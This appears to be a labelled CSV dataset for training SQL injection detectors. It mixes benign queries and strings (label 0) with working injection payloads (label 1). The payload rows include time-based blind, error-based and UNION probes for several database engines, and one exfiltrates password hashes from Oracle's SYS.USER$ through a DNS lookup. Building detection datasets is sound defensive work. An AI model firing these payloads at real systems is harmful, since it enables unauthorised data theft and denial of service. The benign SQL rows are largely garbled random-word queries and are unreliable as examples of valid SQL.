Query,Label
"||  (  elt  (  -3+5,bin  (  15  )  ,ord  (  10  )  ,hex  (  char  (  45   )    )      )    )",1
SELECT * FROM flow WHERE choice BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM location ORDER BY are,0
SELECT sudden FROM cause UNION SELECT hospital FROM straw ORDER BY pleasure,0
granfiel,0
"1'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )",1
SELECT although FROM order UNION SELECT over FROM single ORDER BY third,0
"1"" union all select null--",1
SELECT * FROM sheet WHERE pool = 'remarkable' LIMIT 3,0
SELECT * FROM labor WHERE Price NOT BETWEEN 10 AND 20,0
"1'  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  'xdfz'  =  'xdfz",1
op0o62i4,0
ehrlich.selwyne@ebaz.ba,0
adria,0
"1%'   )    )    and elt  (  4483  =  5364,5364  )   and    (    (   '%'  =  '",1
SELECT COUNT ( muscle )  FROM pupil,0
6.69143E+14,0
DELETE FROM south WHERE wolf = 'drawn',0
SELECT * FROM special,0
"1""   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  ""mmsh""  =  ""mmsh",1
"SELECT local, needed, ratherFROM law WHERE doctor  IS NOT NULL",0
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367658 ),0
"SELECT * FROM master WHERE rise BETWEEN ""such"" AND    ""model""",0
SELECT COUNT ( against ) FROM hang,0
"1'   )    )    or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
analfabetismo,0
2008,0
SELECT TOP 3 * FROM curious SELECT * FROM halfway 3SELECT * FROM telephone,0
samieian7,0
SELECT * FROM floating,0
SELECT COUNT ( birthID ) FROM rise,0
SELECT * FROM shoe FETCH FIRST 50 PERCENT ROWS ONLY,0
"1%""   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""%""  =  """,1
select pg_sleep  (  5   )    )   ||',1
1 and 7533  =  7533,1
SELECT * FROM toy WHERE factor NOT LIKE '[mill]%',0
cruey,0
1'   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   'hqcz'  =  'hqcz,1
"1%'   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
SELECT TOP 3 * FROM sold WHERE coast = 'must',0
SELECT chamber,0
SELECT result FROM proud UNION ALL SELECT farm FROM silk ORDER BY uncle,0
sappington-espana@fighting-machines.mq,0
"SELECT * FROM means WHERE science BETWEEN ""leaving"" AND    ""title""",0
76156835v,0
SELECT TOP 50 PERCENT * FROM thy,0
SELECT * FROM nearly FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM fully,0
5.58562E+15,0
"1'  )   where 4778  =  4778 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
SELECT * FROM bread,0
"1""  )   where 5197  =  5197 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"select * from generate_series  (  7667,7667,case when   (  7667  =  8232  )   then 1 else 0 end  )   limit 1--",1
"1   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  4127  =  4127",1
SELECT * FROM deep FETCH FIRST 3 ROWS ONLY,0
SELECT bent ( s )  FROM individual UNION ALL,0
1'   )    )    as yefv where 4263  =  4263,1
5.56878E+15,0
enang.ostar,0
"1"" where 2642  =  2642 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"camio da mina, 175,",0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 13278 )  ORDER BY meta_id ASC",0
clipsham5,0
1  )   as usnn where 3201  =  3201,1
"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,1
"SELECT shallID AS ID, pipe AS prove FROM sweet",0
SELECT * FROM bottom WHERE fully BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT option_value FROM wp_options WHERE option_name  =  'ReduxFrameworkPlugin' LIMIT 1,0
doriot,0
1'  )   where 3311  =  3311,1
"-6084""   )    )    union all select 7354,7354,7354,7354,7354,7354,7354,7354#",1
1 where 4949  =  4949,1
(  select * from   (  select  (  sleep  (  5   )    )     )  srmq   )    )   +',1
"1'  )   as tuhc where 4018  =  4018 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"1""   )    )    as hwlh where 1071  =  1071 union all select null,null,null,null,null,null,null,null#",1
if  (  1928  =  4811  )   select 1928 else drop function ucko--,1
1%'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  '%'  =  ',1
SELECT * FROM  ( SELECT night FROM stick ),0
SELECT * FROM several WHERE individual  BETWEEN 10 AND 20,0
"select * from users where id  =  '1' or \<$ union select 1,@@VERSION -- 1'",1
"SELECT handsome, brain, breakfast FROM port WHERE rule  IS NULL",0
laguna abusaid,0
"c/ valtravieso s/n,",0
SELECT AVG ( general )  FROM one  SELECT SUM ( cold ),0
"-1663' or elt  (  1032  =  1032,3623  )   and 'yqaj' like 'yqaj",1
"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1
"purpurania, 79 3?b",0
DELETE FROM frighten WHERE ordinary = 'fine',0
"1'   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   'yzdp'  =  'yzdp",1
1.94E+15,0
"c/ echegaray s/n,",0
1'||  (  select 'ghby' from dual where 4854  =  4854,1
SELECT enemy ( s )  FROM five SELECT wrong FROM wind,0
"SELECT * FROM farm ORDER BY spoken ASC, home DESC",0
"1""  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  ""bvdv"" like ""bvdv",1
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1
"SELECT * FROM call WHERE fix BETWEEN ""whether"" AND    ""locate""",0
-9429'  )   order by 1--,1
SELECT * FROM population ORDER BY development DESC,0
"SELECT truckID AS ID, article AS death FROM live",0
SELECT option_value FROM wp_options WHERE option_name  =  'wpassetcleanup_bulk_unload' LIMIT 1,0
1'   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'cuav'  =  'cuav,1
5.95675E+15,0
montamarta,0
8.83838E+15,0
SELECT * FROM running WHERE    NOT frog = 'forest',0
"-3633'  )   where 3513  =  3513 union all select 3513,3513,3513,3513,3513,3513,3513,3513,3513,3513#",1
SELECT * FROM mirror 3 SELECT * FROM pen,0
"-9136'  )   or make_set  (  9354  =  9354,7185  )",1
kellard@todobetis.gf,0
end and 'aenf'  =  'aenf,1
1'  )   where 5616  =  5616,1
"-7574%""  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""%""  =  """,1
"-3581'||  (  select 'uxmh' from dual where 8954  =  8954 union all select 8954,8954,8954,8954,8954,8954#",1
"-4826 union all select 4532,4532,4532,4532,4532--",1
"1%"" and elt  (  1210  =  1210,sleep  (  5   )    )    and ""%""  =  """,1
"SELECT do,fort FROM know WHERE sitting = 'fallen' UNION SELECT during, plane FROM pencil",0
maracaja@telogis.ad,0
calle villalon 13 1g,0
DELETE FROM stomach WHERE memory = 'later',0
1  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  3530  =  3530,1
66837882c,0
"SELECT determine,effect,muscle FROM plates LEFT JOIN Orders ON supper.essentialID =  this.balance ORDER BY coat.zero",0
rufino@citycvs.as,0
1'   )    )    as myws where 5274  =  5274,1
ponsati puratic,0
segura de los baos,0
1'+  (  select 'tmel' where 2655  =  2655 rlike   (  select   (  case when   (  2118  =  8500  )   then 1 else 0x28 end   )    )     )  +',1
"1""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""ubxw"" like ""ubxw",1
"1%""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""%""  =  """,1
"1  )   as zqxa where 5718  =  5718 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
SELECT * FROM break,0
"SELECT Orders.shoutrID, Employees.twenty, Employees.be FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.settleID ORDER BY Orders.governmentID",0
SELECT CONNECTION_ID (  ) ;,0
"1'||  (  select 'yags' where 6268  =  6268 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    )   ||'",1
cobo,0
SELECT * FROM get WHERE citizen BETWEEN alone09/01/1996getting AND behavior15/31/1996under,0
"1' or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )",1
SELECT * FROM ranch WHERE adult NOT BETWEEN 'pure' AND 'chamber',0
24324,0
"calle ribadeo 78,",0
SELECT option_value FROM wp_options WHERE option_name  =  'options_middle_button_text' LIMIT 1,0
"-9861' union all select 5710,5710,5710,5710,5710--",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 239186 )  ORDER BY meta_id ASC",0
"-9565"" where 1616  =  1616 union all select 1616,1616,1616,1616--",1
"SELECT * FROM felt ORDER BY mind ASC, buy DESC",0
"1' and make_set  (  8403  =  8403,8899  )",1
1   )    )    as muyz where 6105  =  6105,1
igea,0
"SELECT COUNT ( fought ) , sweet FROM factor BY stage",0
"1%""  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,1
FROM  ( SELECT DISTINCT low FROM wish ),0
SELECT * FROM crop WHERE yet BETWEEN '1996-07-01' AND '1996-07-31',0
cosmo@vilainstal.sv,0
SELECT * FROM tea WHERE captain NOT BETWEEN 'just' AND 'park',0
"(  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (     (  ""%""  =  """,1
"SELECT column_name ( s )  FROM women,outside",0
"1   )    )    as zdbj where 2300  =  2300   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",1
FROM  ( SELECT DISTINCT airplane FROM flow ),0
36677303p,0
SELECT * FROM alike WHERE sudden = 'immediately',0
"-1055"" or   (  8459  =  8459  )  *4906 and ""kdbr""  =  ""kdbr",1
SELECT too FROM particularly UNION ALL SELECT bit FROM plan ORDER BY nature,0
e298r4jina715,0
SELECT * FROM improve FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM gift,0
"INSERT INTO concerned ( term, prepare, no, castle, correctly, remove )  VALUES  ( 'gift', 'highest'. shorter', 'parallel', 'clear', 'third', 'globe' )",0
SELECT * FROM steep 3 SELECT * FROM dangerous,0
"1 where 5099  =  5099 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
SELECT * FROM mighty WHERE NOT guard = 'distance'  AND NOT far = 'government',0
"1'  )   where 2443  =  2443 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1
00033926r,0
SELECT DISTINCT myself FROM storm,0
1'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   'czqk' like 'czqk,1
1' where 1692  =  1692,1
"SELECT tall, desert, market FROM soap WHERE depth  IS NULL",0
1464,0
1  )   where 4548  =  4548 and 9198  =  9198--,1
3390,0
comba,0
; exec xp_regread,1
SELECT COUNT ( everything )  FROM typical,0
glazer,0
SELECT * FROM farm WHERE herself  BETWEEN 10 AND 20,0
galligan@bijoubijoudiferente.vg,0
"1'+  (  select 'vwzp' where 2729  =  2729 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
scardetta huerta,0
"1'   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
sidonio,0
DELETE FROM citizen,0
SELECT * FROM older WHERE NOT regular = 'lead'  AND NOT clearly = 'straw',0
6.83781E+15,0
7.6744E+15,0
gracomda7,0
"-8065""   )    )     )   order by 1--",1
"UPDATE through SET count =  'piano', City =  'plane' WHERE chief =  simple",0
"1'   )    )    and make_set  (  3793  =  8118,8118  )   and    (    (   'swvc' like 'swvc",1
-3424'   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   'dyuo'  =  'dyuo,1
"1"" where 4281  =  4281",1
"-5827""  )   as lskq where 7683  =  7683 union all select 7683,7683,7683,7683,7683#",1
34192,0
"SELECT grade,wagon,worse FROM accident LEFT JOIN Orders ON spend.ownerID =  buy.coming ORDER BY aware.pool",0
1'   )    )    as plgq where 1121  =  1121,1
-7552 or 6872  =  6872,1
DELETE FROM society WHERE center = 'view',0
"1%""   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""%""  =  """,1
tait@ibizasounds.ir,0
cicek0,0
"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",1
kwangchi,0
brando@elsentidodelavida.lc,0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""%""  =  """,1
"calle perez galdos 193,",0
"select * from users where id  =  1 union select 1||1,version  (    )   -- 1",1
SELECT LENGTH ( CustomerName )  AS LengthOfName FROM Customers;,0
"1'   )    )    as lxjs where 6503  =  6503 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1
SELECT * FROM moon 3,0
SELECT AVG ( Price ) FROM beyond,0
1   )    )    as efjb where 4642  =  4642 order by 1#,1
"1%"" and elt  (  5345  =  8751,8751  )   and ""%""  =  """,1
8773,0
"SELECT YEAR ( ""2017-06-15"" ) ;",0
SELECT TRIM ( 'Â Â Â  SQL TutorialÂ Â Â  ' )  AS TrimmedString;,0
1.61637E+15,0
SELECT * FROM explore WHERE turn = 'general' LIMIT 3,0
a7p9i9bl2,0
75590487k,0
"admin""  )   or   (  ""1""  =  ""1""#",1
"1'  )   as pfwt where 8448  =  8448 union all select null,null,null,null,null,null,null,null,null#",1
"SELECT tree,food,thumb,shine,nobody     (  (  everyone JOIN ate ON completely.but =  divide.fact )   INNER JOIN bornON Orders.create =  gas.directionID )",0
"1%""   )    )     )   union all select null,null#",1
credido poma,0
SELECT * FROM sell WHERE yard = 'settlers',0
1'   )    )    as nhkp where 8030  =  8030,1
"SELECT broad, blank+ ', ' + alike+ ' ' + managed+ ', ' + smallest AS dangerous  FROM meet",0
"1' where 9961  =  9961 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
SELECT * FROM next FETCH FIRST 50 PERCENT ROWS ONLY,0
"1' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and 'aezm' like 'aezm",1
"1'  )   as ohcs where 9588  =  9588 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1
"1""   )    )    and   (  3020  =  3020  )  *6703 and    (    (   ""bely""  =  ""bely",1
eberto,0
"1   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  2952  =  2952",1
"SELECT POWER ( 4, 2 ) ;",0
pusit@marketingmunicipal.ro,0
00783778f,0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual-- vykx",1
el-hawar,0
69557398q,0
SELECT * FROM buffalo WHERE rest BETWEEN person09/01/1996meat AND touch15/31/1996copy,0
"1""   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""ksxz""  =  ""ksxz",1
